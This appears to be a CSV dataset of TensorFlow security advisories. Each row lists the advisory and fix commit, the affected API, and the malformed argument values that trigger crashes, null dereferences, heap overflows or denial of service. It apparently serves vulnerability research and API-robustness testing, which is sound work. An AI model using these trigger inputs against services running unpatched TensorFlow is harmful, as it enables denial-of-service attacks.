+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Empty input,"input=[],",input,N.A,nullptr dereference,undefined behavior
+,,,,,,,,,,
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g25h-jr74-qp5j,https://github.com/tensorflow/tensorflow/commit/6da6620efad397c85493b8f8667b821403516708,tf.raw_ops,tf.raw_ops.QuantizeV2,Element mismatch,"min_range=[1,2],
+max_range=[],","min_range
+max_range",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4c4-5fpq-56wg,https://github.com/tensorflow/tensorflow/commit/e84c975313e8e8e38bb2ea118196369c45c51378,tf.raw_ops,tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit,Element mismatch,"stats_summary_indices=[[1, 2, 3, 0x1000000]],",stats_summary_indices,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gf88-j2mg-cc82,https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992,tensorflow.python.ops,gen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource,Negative argument,"num_streams = [-49],",num_streams,N.A,N.A,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cm5x-837x-jf3c,https://github.com/tensorflow/tensorflow/commit/e86605c0a336c088b638da02135ea6f9f6753618,tf.raw_ops,tf.raw_ops.InplaceSub,Empty input,x=[],x,N.A,division by zero,Floating point exception
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q3g3-h9r4-prrc,https://github.com/tensorflow/tensorflow/commit/93f428fd1768df147171ed674fee1fc5ab8309ec,tf.raw_ops,tf.raw_ops.SqrtGrad,Element mismatch,"y=[4, 16]
+dy=[]","y, dy",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6p5r-g9mq-ggh2,https://github.com/tensorflow/tensorflow/commit/ff8894044dfae5568ecbf2ed514c1a37dc394f1b,tf.raw_ops,tf.raw_ops.MatrixSetDiagV3,Empty input,"k=[],",k,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5xwc-mrhx-5g3m,https://github.com/tensorflow/tensorflow/commit/f2a673bd34f0d64b8e40a551ac78989d16daad09,tf.raw_ops,tf.raw_ops.MatrixDiagV3,Empty input,"k=[],",k,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4xfp-4pfp-89wg,https://github.com/tensorflow/tensorflow/commit/1071f554dbd09f7e101324d366eec5f4fe5a3ece,tf.raw_ops,tf.raw_ops.RaggedTensorToSparse,Non increasing order of elements,"rt_nested_splits=[[0, 38, 0]],",rt_nested_splits,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7fvx-3jfc-2cpc,https://github.com/tensorflow/tensorflow/commit/01cff3f986259d661103412a20745928c727326f,tf.raw_ops,tf.raw_ops.ResourceScatterUpdate,Dimension mismatch,"indices=[0],
+updates=['1', '2', '3', '4', '5']","indices
+updates",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r8p-fg3c-wcj4,https://github.com/tensorflow/tensorflow/commit/bc9c546ce7015c57c2f15c168b3d9201de679a1d,tf.raw_ops,tf.raw_ops.ResourceGather,Dimension mismatch,"batch_dims=10,",batch_dims,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qjj8-32p7-h289,https://github.com/tensorflow/tensorflow/commit/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11,tf.raw_ops,tf.raw_ops.ResourceGather,Zero argument,"indices=[0],",indices,N.A,floating point exception,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"orig_input_tensor_shape=[0,1,2,3],",orig_input_tensor_shape,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"row_pooling_sequence=[0, 0, 0, 0, 0],",row_pooling_sequence,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr,https://github.com/tensorflow/tensorflow/commit/0f931751fb20f565c4e94aa6df58d54a003cdb30,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Zero element ,"col_pooling_sequence=[-2, 0, 0, 2, 0],",col_pooling_sequence,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f8h4-7rgh-q2gm,https://github.com/tensorflow/tensorflow/commit/e0b6e58c328059829c3eb968136f17aa72b6c876,tf.raw_ops,tf.raw_ops.ExperimentalDatasetToTFRecord,String input dataset,"input_dataset=dataset,",input_dataset,N.A,heap buffer overflow,segfault
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6gv8-p3vj-pxvr,https://github.com/tensorflow/tensorflow/commit/7bdf50bb4f5c54a4997c379092888546c97c3ebd,tf.raw_ops,tf.raw_ops.UncompressElement,Tensor input,"compressed=tf.data.experimental.to_variant(data),",compressed,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c5x2-p679-95wc,https://github.com/tensorflow/tensorflow/commit/02cc160e29d20631de3859c6653184e3f876b9d7,tf.raw_ops,tf.raw_ops.SparseTensorSliceDataset,Empty input,"indices=[[],[],[]],",indices,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h6jh-7gv5-28vg,https://github.com/tensorflow/tensorflow/commit/c283e542a3f422420cfdb332414543b62fc4e4a5,tf.raw_ops,tf.raw_ops.StringNGrams,Negative argument,"ngram_widths=[-80,0,0,-60],",ngram_widths,N.A,integer type conversion,integer overflow
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9w2p-5mgw-p94c,https://github.com/tensorflow/tensorflow/commit/96f364a1ca3009f98980021c4b32be5fdcca33a1,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV4Grad,Negative argument,"axis=-100,",axis,N.A,integer type conversion,integer overflow
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fcwc-p4fc-c5cc,https://github.com/tensorflow/tensorflow/commit/482da92095c4d48f8784b1f00dda4f81c28d2988,tf.raw_ops,tf.raw_ops.MatrixDiagPartV2,Non scalar input,padding_value=[],padding_value,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-27j5-4p9v-pp67,https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2,tf.raw_ops,tf.raw_ops.TensorListReserve,Negative argument,num_elements=tf.constant([-1],num_elements,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8,https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373,tf.raw_ops,tf.raw_ops.RaggedGather,Rank less than 1,"params_nested_splits = [0,0,0]",params_nested_splits,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8,https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373,tf.raw_ops,tf.raw_ops.RaggedGather,Empty input,"params_nested_splits = [0,0,0]",params_nested_splits,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-ch4f-829c-v5pw,https://github.com/tensorflow/tensorflow/commit/4aacb30888638da75023e6601149415b39763d76,tf.raw_ops,tf.raw_ops.ResourceScatterDiv,Zero element ,updates=[0],updates,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-95xm-g58g-3p88,https://github.com/tensorflow/tensorflow/commit/4923de56ec94fff7770df259ab7f2288a74feb41,tf.raw_ops,tf.raw_ops.SparseReshape,Zero element ,"input_shape = np.array([1,1,0]),
+new_shape = np.array([1,0])","input_shape, new_shape",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4,https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622,tf.raw_ops,tf.raw_ops.Restore,Empty input,tensor_name=[],tensor_name,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4,https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622,tf.raw_ops,tf.raw_ops.RestoreSlice,Empty input,tensor_name=[],tensor_name,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hwr7-8gxx-fj5p,https://github.com/tensorflow/tensorflow/commit/301ae88b331d37a2a16159b65b255f4f9eb39314,tf.raw_ops,tf.raw_ops.RaggedTensorToTensor,Empty input,row_partition_types=[],row_partition_types,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9qf-r67m-p7cg,https://github.com/tensorflow/tensorflow/commit/5dc7f6981fdaf74c8c5be41f393df705841fb7c5,tf.raw_ops,tf.raw_ops.CompressElement,Empty input,components=[[]],components,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hp4c-x6r7-6555,https://github.com/tensorflow/tensorflow/commit/d9204be9f49520cdaaeb2541d1dc5187b23f31d9,tf.raw_ops,tf.raw_ops.SparseDenseCwiseDiv,Empty input,dense=np.array([0]),dense,N.A,floating point exception,division by zero
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wvjw-p9f5-vq28,https://github.com/tensorflow/tensorflow/commit/82e6203221865de4008445b13c69b6826d2b28d9,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Zero element ,dense_shape=[],dense_shape,N.A,N.A,segfault
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mmq6-q8r3-48fm,https://github.com/tensorflow/tensorflow/commit/890f7164b70354c57d40eda52dcdd7658677c09f,tf.strings,tf.strings.substr,Dimension mismatch,"len=1
+pos=[1,-1]","len
+pos",N.A,N.A,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xqfj-cr6q-pc8w,https://github.com/tensorflow/tensorflow/commit/1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88,tf.raw_ops,tf.transpose,Argument mismatch,"conjugate=True
+a=complex(1)","conjugate
+a",N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8pmx-p244-g88h,https://github.com/tensorflow/tensorflow/commit/698e01511f62a3c185754db78ebce0eee1f0184d,tf.io,tf.io.decode_raw,Argument mismatch,"tf.uint16
+fixed_length=4","tf.uint16
+fixed_length",N.A,wrong results,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,First dimension is zero,"inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)",inputs,N.A,out of bound read,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,Second dimension less than 1,"labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)",labels_indices ,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7,https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c,tf.raw_ops,tf.raw_ops.CTCLoss,Empty input,"labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
+labels_values = tf.constant([], shape=[0], dtype=tf.int32)","labels_indices
+labels_values",N.A,nullptr dereference,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2xgj-xhgf-ggjv,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.BandedTriangularSolve,Empty input,"matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)
+rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)","matrix_tensor
+rhs_tensor",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mq5c-prh3-3f3h,https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV2,Rank less than 1,axis=-2,axis,N.A,heap underflow,read/write to other data on the heap
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Scalar input,"input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)",input_indices,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Scalar input,"input_shape = tf.zeros([11], dtype=tf.int64)",input_shape,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f,https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6,tf.raw_ops,tf.raw_ops.SparseReshape,Dimension mismatch,"new_shape = tf.zeros([1], dtype=tf.int64)",new_shape,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Dimension mismatch,"a_indices = tf.ones([45, 92], dtype=tf.int64)
+b_indices = tf.ones([1, 1], dtype=tf.int64)","a_indices
+b_indices",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Dimension mismatch,"a_indices = tf.ones([45, 92], dtype=tf.int64)
+a_shape = tf.ones([1], dtype=tf.int64)","a_indices
+a_shape",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq,https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2,tf.raw_ops,tf.raw_ops.SparseSparseMinimum,Empty input,"a_indices = tf.ones([45, 92], dtype=tf.int64)
+a_values = tf.ones([45], dtype=tf.int64)
+a_shape = tf.ones([1], dtype=tf.int64)
+b_indices = tf.ones([1, 1], dtype=tf.int64)
+b_values = tf.ones([1], dtype=tf.int64)
+b_shape = tf.ones([1], dtype=tf.int64)","a_indices
+a_values 
+a_shape
+b_indices
+b_values
+b_shape",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Dimension mismatch,"a_indices = tf.zeros([10, 97], dtype=tf.int64)
+a_values = tf.zeros([10], dtype=tf.int64)","a_indices
+a_shape",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Empty input,"a_indices = tf.zeros([10, 97], dtype=tf.int64)
+a_values = tf.zeros([10], dtype=tf.int64)
+a_shape = tf.zeros([0], dtype=tf.int64)
+b_indices = tf.zeros([0, 0], dtype=tf.int64)
+b_values = tf.zeros([0], dtype=tf.int64)
+b_shape = tf.zeros([0], dtype=tf.int64)","a_indices
+a_values 
+a_shape
+b_indices
+b_values
+b_shape",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64,https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc,tf.raw_ops,tf.raw_ops.SparseAdd,Dimension mismatch,"b_indices = tf.zeros([0, 0], dtype=tf.int64)",b_indices,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rgvq-pcvf-hx75,https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a,tf.raw_ops,tf.raw_ops.RaggedTensorToTensor,Empty input,"shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)
+values = tf.constant([], shape=[0], dtype=tf.int64)
+default_value = tf.constant(404, dtype=tf.int64)
+row = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)","shape
+values
+default_value
+row",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cfx7-2xpc-8w4h,https://github.com/tensorflow/tensorflow/commit/2c74674348a4708ced58ad6eb1b23354df8ee044,tf.raw_ops,tf.raw_ops.BatchToSpaceNd,Zero element ,N.A,N.A,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v52p-hfjf-wg88,https://github.com/tensorflow/tensorflow/commit/6d36ba65577006affb272335b7c1abd829010708,tf.raw_ops,tf.raw_ops.SpaceToBatchND,Zero element ,N.A,N.A,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97wf-p777-86jq,https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d,tf,tf.split,Zero argument,num_or_size_splits=0,num_or_size_splits,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j8qh-3xrq-c825,https://github.com/tensorflow/tensorflow/commit/3ebedd7e345453d68e279cfc3e4072648e5e12e5,tf,tf.one_hot,Zero element ,"indices=[1,1,0,1],",indices,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9xh4-23q4-v6wr,https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0,tf.raw_ops,tf.raw_ops.FusedBatchNorm,Empty input,"scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
+offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
+mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
+variance = tf.constant([0.0], shape=[1], dtype=tf.float32)","scale
+offset
+mean
+variance",N.A,heap buffer overflow,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xvjm-fvxx-q3hv,https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60,tf.raw_ops,tf.raw_ops.SparseSplit,Very large input argument,"shape=(input_layer, input_layer),",shape,N.A,check failure,integer overflow
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c45w-2wxr-pp53,https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b,tf.raw_ops,tf.raw_ops.Dequantize,Dimension mismatch,"min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
+max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)","min_range
+max_range",N.A,out of bound read,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vq2r-5xvm-3hc3,https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e,tf.raw_ops,tf.raw_ops.CTCBeamSearchDecoder,Empty input,"inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)",inputs,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6f89-8j54-29xf,https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Not enough elements,"row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
+col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)","""row_pooling_sequence
+col_pooling_sequence",N.A,heap buffer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x8h6-xgqx-jqgp,https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925,tf.raw_ops,tf.raw_ops.FractionalMaxPoolGrad,Empty input,"orig_output = tf.constant([], dtype=tf.int64) ",orig_output,N.A,check failure,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6r6-84gr-92rm,https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d,tf.raw_ops,tf.raw_ops.AvgPool3DGrad,Dimension mismatch,"orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
+grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)","orig_input_shape
+grad",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7cqx-92hp-x6wh,https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09,tf.raw_ops,tf.raw_ops.MaxPool3DGradGrad,Dimension mismatch,"orig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)
+grad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)","orig_input
+grad",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-828x-qc2p-wprq,https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4,tf.raw_ops,tf.raw_ops.MaxPool3DGradGrad,Empty input,"orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
+orig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
+grad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)","orig_input
+orig_output
+grad",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9vpm-rcf4-9wqw,https://github.com/tensorflow/tensorflow/commit/376c352a37ce5a68b721406dc7e77ac4b6cf483d,tf.raw_ops,tf.raw_ops.MaxPoolGradWithArgmax,Empty input,"input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
+grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
+argmax = tf.constant([], shape=[0], dtype=tf.int64)","input
+grad
+argmax",N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6qgm-fv6v-rfpv,https://github.com/tensorflow/tensorflow/commit/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23,tf.raw_ops,tf.raw_ops.ReverseSequence,Negative argument,seq_dim=-2,seq_dim,N.A,check failure,stack overflow
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6qgm-fv6v-rfpv,https://github.com/tensorflow/tensorflow/commit/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23,tf.raw_ops,tf.raw_ops.ReverseSequence,Negative argument,batch_dim=-2,batch_dim,N.A,check failure,stack overflow
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5gqf-456p-4836,https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb,tf.raw_ops,tf.raw_ops.SdcaOptimizer,Length mismatch,"sparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
+sparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]","sparse_indices
+sparse_weights",N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5gqf-456p-4836,https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb,tf.raw_ops,tf.raw_ops.SdcaOptimizer,Dimension mismatch,"sparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
+sparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]","sparse_example_indices
+sparse_feature_indices",N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-whr9-vfh2-7hm6,https://github.com/tensorflow/tensorflow/commit/79865b542f9ffdc9caeb255631f7c56f1d4b6517,tf.raw_ops,tf.raw_ops.DrawBoundingBoxesV2,Element other than 4,"boxes = tf.fill([10, 53, 0], 0.)",boxes,N.A,out of bound read,memory corruption
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3h8m-483j-7xxm,https://github.com/tensorflow/tensorflow/commit/ef0c008ee84bad91ec6725ddc42091e19a30cf0e,tf.raw_ops,tf.raw_ops.RequantizationRange,Empty input,"input_max = tf.constant([], dtype=tf.float32)
+input_min = tf.constant([], dtype=tf.float32)","input_max
+input_min",N.A,out of bound read,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-545v-42p7-98fq,https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886,tf.raw_ops,tf.raw_ops.MaxPoolGradWithArgmax,Dimension mismatch,"input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)
+argmax = tf.constant([1], shape=[1], dtype=tf.int64)","input
+argmax",N.A,out of bound read,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wp3c-xw9g-gpcg,https://github.com/tensorflow/tensorflow/commit/7ae2af34087fb4b5c8915279efd03da3b81028bc,tf.raw_ops,tf.raw_ops.SparseDenseCwiseMul,Dimension mismatch,"indices = tf.constant([], shape=[10, 0], dtype=tf.int64)
+values = tf.constant([], shape=[0], dtype=tf.int64)","indices
+values",N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4p4p-www8-8fv9,https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8,tf.raw_ops,tf.raw_ops.ParameterizedTruncatedNormal,Empty input,"shape = tf.constant([], shape=[0], dtype=tf.int32)",shape,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6pg-pjwc-j585,https://github.com/tensorflow/tensorflow/commit/faa76f39014ed3b5e2c158593b1335522e573c7f,tf.raw_ops,tf.raw_ops.SparseFillEmptyRows,Empty input,"dense_shape = tf.constant([], shape=[0], dtype=tf.int64),",dense_shape,N.A,nullptr dereference,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75f6-78jr-4656,https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3,tf.raw_ops,tf.raw_ops.EditDistance,Dimension mismatch,"hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
+hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)","hypothesis_indices
+hypothesis_values",N.A,nullptr dereference,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75f6-78jr-4656,https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3,tf.raw_ops,tf.raw_ops.EditDistance,Dimension mismatch,"truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
+truth_values = tf.constant([], shape=[0], dtype=tf.float32)","truth_indices
+truth_values",N.A,nullptr dereference,N.A
